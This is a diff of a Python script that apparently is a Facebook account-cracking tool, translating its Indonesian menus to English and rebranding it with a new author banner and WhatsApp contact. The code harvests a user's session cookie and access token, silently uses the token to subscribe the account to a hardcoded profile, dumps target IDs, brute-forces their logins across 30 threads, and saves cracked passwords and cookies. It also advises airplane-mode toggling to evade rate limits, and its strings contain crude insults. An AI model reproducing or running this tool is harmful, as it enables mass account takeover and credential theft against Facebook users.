@@ -103,7 +103,7 @@ def uaku():
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-#------------[ WARNA-COLOR ]--------------#
+#------------[ COLOR-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -116,15 +116,15 @@ Z = "\033[1;30m"
 sir = '\033[41m\x1b[1;97m'
 x = '\33[m' # DEFAULT
 m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
+k = '\033[93m' # YELLOW +
+h = '\x1b[1;92m' # GREEN +
+hh = '\033[32m' # GREEN -
+u = '\033[95m' # PURPLE
+kk = '\033[33m' # YELLOW -
+b = '\33[1;96m' # BLUE -
+p = '\x1b[0;34m' # BLUE +
 asu = random.choice([m,k,h,u,b])
-#--------------------[ CONVERTER-BULAN ]--------------#
+#--------------------[ CONVERTER-MONTH ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
@@ -141,11 +141,11 @@ def back():
 	login()
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
-	print(f'\t       FACEBOOK ')
+	print(f'\t       RSCT TEAM NIG. ')
 #  print(f'\t THE MEMEKERS  ')
-	print(f'\t  Author <•> Wibu-ID ')
-	print(f'\t    From <•> INDONESIA ')
-#--------------------[ BAGIAN-MASUK ]--------------#
+	print(f'\t  Author <•> RYDAH XYBER ')
+	print(f'\t    Whatsapp <•> 2349017624430 ')
+#--------------------[ PARTS-IN ]--------------#
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -169,50 +169,50 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		cetak(nel('\t©©© Suggested Extension : [green]Cookiedough[white] ©©©'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] Enter Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} SUCCESSFULLY LOGIN.........RUN COMMAND AGAIN!!!!{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		print(f'  %s[%sx%s]%s LOGIN FAILED.....TRY AGAIN !!%s'%(x,k,x,m,x))
 		exit()
 def bot():
 	try:
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
-#------------------[ BAGIAN-MENU ]----------------#
+#------------------[ SECTION-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print('[×] Cookies Kadaluarsa ')
+		print('[×] Expired Cookies ')
 		time.sleep(5)
 		login_lagi334()
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
 # gh = 'github.com/Al-Vino'
-	cetak(nel('\tSelamat Datang [yellow]%s[white] Goblokkk'%(my_name)))
-	print(f'<•> ID Anda: '+str(my_id))
-	print(f'<•> IP Anda : {ip}')
+	cetak(nel('\tWelcome [yellow]%s[white] Goblokkk'%(my_name)))
+	print(f'<•> Your ID: '+str(my_id))
+	print(f'<•> Your IP : {ip}')
 # print(f'>> Github   : {gh}')
 	print('')
-	print('<•> 1. Crack Publik ')
+	print('<•> 1. Crack Public ')
 # print('>> 2. Crack Follower ')
 # print('>> 3. Crack Grup   ')
 # print('>> 4. Crack File	')
-	print('<•> 5. Hasil Crack  ')
-	print('<•> 0. Keluar       ')
-	_____alvino__adijaya_____ = input('\n<•> Pilih : ')
+	print('<•> 5. Crack Results  ')
+	print('<•> 0. Log Out       ')
+	_____alvino__adijaya_____ = input('\n<•> Choose : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['2']:
@@ -226,29 +226,29 @@ def menu(my_name,my_id):
 	elif _____alvino__adijaya_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('<•> Sukses Logout+Hapus Kukis ')
+		print('<•> Successfully Logout+Delete Cookies ')
 		exit()
 	else:
-		print('<•> Pilih Yang Bener Tod ')
+		print('<•> Choose the Right One ')
 		back()
 def error():
-	print(f'{k}<•> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	print(f'{k}<•> Sorry, this feature is still being fixed {x}')
 	time.sleep(4)
 	back()
-#-----------------[ HASIL-CRACK ]-----------------#
+#-----------------[ RESULT-CRACK ]-----------------#
 def result():
-	print(f'<•> 1. Hasil {h}OK{x} Anda ')
-	print(f'<•> 2. Hasil {k}CP{x} Anda ')
-	print('<•> 3. Kembali	')
-	kz = input(f'\n<•> Pilih : ')
+	print(f'<•> 1. Results {h}OK{x} You ')
+	print(f'<•> 2. Results {k}CP{x} You ')
+	print('<•> 3. Return	')
+	kz = input(f'\n<•> Choose : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('<•> File Tidak Di Temukan ')
+			print('<•> File Not Found ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print('<•> Anda Tidak Memiliki Hasil CP ')
+			print('<•> You Have No CP Results ')
 			time.sleep(2)
 			back()
 		else:
@@ -266,14 +266,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n<•> Pilih : ')
+			geeh = input('\n<•> Choose : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('<•> Pilih Yang Bener Kontol ')
+				print('<•> Choose the Right Cock ')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print('<•> File Tidak Di Temukan ')
+				print('<•> File Not Found ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -282,16 +282,16 @@ def result():
 				print(f'{x}<•> {k}{cpkuni[0]}|{cpkuni[1]}')
 				nocp +=1
 			print('')
-			input(f'{x}[{m} Klik Enter{x} ]')
+			input(f'{x}[{m} Click Enter{x} ]')
 			back()
 	elif kz in ['1']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print('<•> File Tidak Di Temukan ')
+			print('<•> File Not Found ')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print('<•> Anda Tidak Mempunyai File OK ')
+			print('<•> You Don't Have File OK ')
 			time.sleep(2)
 			back()
 		else:
@@ -312,11 +312,11 @@ def result():
 			geeh = input(f'\nPilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('<•> Pilih Yang Bener Kontol ')
+				print('<•> Choose the Right Cock ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print('<•> File Tidak Di Temukan ')
+				print('<•> File Not Found ')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -326,14 +326,14 @@ def result():
 				print(f'{x}<•> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
 				nocp +=1
 			print('')
-			input(f'{x}[{m} Klik Enter{x} ]')
+			input(f'{x}[{m} Click Enter{x} ]')
 			back()
 	elif kz in ['3']:
 		back()
 	else:
-		print('<•> Pilih Yang Bener Kontol ')
+		print('<•> Choose the Right Cock ')
 		back()
-#-------------------[ CRACK-PUBLIK ]----------------#
+#-------------------[ CRACK-PUBLIC ]----------------#
 def dump_massal():
 	try:
 		token = open('.token.txt','r').read()
@@ -341,18 +341,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('<•> Mau Berapa Target Asu ? : '))
+		jum = int(input('<•> Input Target ID Limit ? : '))
 	except ValueError:
-		print('<•> Masukkan Angka Anjing, Malah Huruff ')
+		print('<•> Enter Dog Numbers, Even Letter f ')
 		exit()
 	if jum<1 or jum>100:
-		print('<•> Gagal Dump Idz ')
+		print('<•> Failed Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('<•> Masukkan ID '+str(yz)+' : ')
+		kl = input('<•> Enter ID '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -366,27 +366,27 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print('<•> Sinyal Loh Kek Kontoll ')
+			print('<•> Signal Error ')
 			exit()
 	try:
 		print('')
-		print(f'<•> ID Terkumpul🙈{h}'+str(len(id)))
+		print(f'<•> Collected ID🙈{h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('<•> Sinyal Lo kek Kontol ')
+		print('<•> Signal Error ')
 		back()
 	except (KeyError,IOError):
-		print(f'<•>{k} Pertemanan Tidak Public {x}')
+		print(f'<•>{k} Friendship Not Public {x}')
 		time.sleep(3)
 		back()
 
-#-------------[ PENGATURAN-IDZ ]---------------#
+#-------------[ SETTINGS-IDZ ]---------------#
 def setting():
-	print(f'{x}<•> 1. Akun Old ')
-	print('<•> 2. Akun New ')
-	print('<•> 3. Random ')
-	hu = input('<•> Pilih : ')
+	print(f'{x}<•> 1. Old Account ')
+	print('<•> 2. New Account ')
+	print('<•> 3. Random Account (Recommended) ')
+	hu = input('<•> Choose : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -405,18 +405,18 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print('<•> Pilih Yang Bener Kontooll ')
+		print('<•> Choose the Right Option ')
 		exit()
-	print('<•> 1. m.facebook.com')
+	print('<•> 1. Login From m.facebook.com')
 # print('>> 2. Mbasic ')
 # print('>> 3. Touch  ')
 # print('>> 4. Mtouch ')
 # print('')
-	hc = input('<•> Pilih : ')
+	hc = input('<•> Choose : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('<•> Pilih Yang Bener Kontol ')
+		print('<•> Choose the Right Cock ')
 		setting()
 	elif hc in ['2','02']:
 		method.append('free')
@@ -427,32 +427,32 @@ def setting():
 	else:
 		method.append('mobile')
 	print('')
-	_jembot_ = input('<•> Tambahkan Aplikasi ( Y/t ) ')
+	_jembot_ = input('<•> Add App ( Y/t ) ')
 	if _jembot_ in ['']:
-		print('<•> Pilih Yang Bener Kontol ')
+		print('<•> Choose Right Option ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('<•> Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('<•> Add Password Manual ( Y/t ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('<•> Masukkan Password Tambahan : ')
+		cetak(nel('[[cyan]•[white]] Enter an additional password of at least 6 characters\n[[cyan]•[white]] Example :[green] 1234,12345,123456[white] '))
+		pwku=input('<•> Enter Additional Password : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
 	passwrd()
-#-------------------[ BAGIAN-WORDLIST ]------------#
+#-------------------[ SECTION-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Biji Kontol Mu {m}•{k}•{h}•{x} <<<<< ')
+	print(f'>>>>> {m}•{k}•{h}•{x} Shifting Your Cock Seeds {m}•{k}•{h}•{x} <<<<< ')
 	print('')
-	print(f'<•> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'<•> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'<•> Mainkan Mode Pesawat Setiap {m}500{x} ID\n')
+	print(f'<•> Results {h}OK{x} Saved in : {h}OK/%s {x}'%(okc))
+	print(f'<•> Results {k}CP{x} Saved in : {k}CP/%s {x}'%(cpc))
+	print(f'<•> Play Airplane Mode Every {m}500{x} ID\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -488,12 +488,12 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	cetak(nel('\t[cyan]✓[green] Crack Complete, Don't Forget to give our team credit[cyan] ✓[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	print('<•> Lanjut Crack ( Y/t ) ? ')
-	woi = input('<•> Pilih : ')
+	print('<•> Continue Crack ( Y/t ) ? ')
+	woi = input('<•> Choose : ')
 	if woi in ['y','Y']:
 		back()
 	else:
@@ -504,7 +504,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r🙈 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\rCHECK-POINT {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -558,7 +558,7 @@ def crack(idf,pwv):
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
+					print(f'\r{x}——>SUCCESSFUL {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
 					os.popen('play-audio data/ok.mp3')
 					ok+=1
 					break
@@ -571,7 +571,7 @@ def crack(idf,pwv):
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\rCHECK-POINT {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -614,7 +614,7 @@ def crackfree(idf,pwv):
 				for muncul in apkexp:
 					hit+=1
 					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
+				print(f'\r{x}——>SUCCESSFUL {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
 				os.popen('play-audio .ok.mp3')
 				ok+=1
 				break
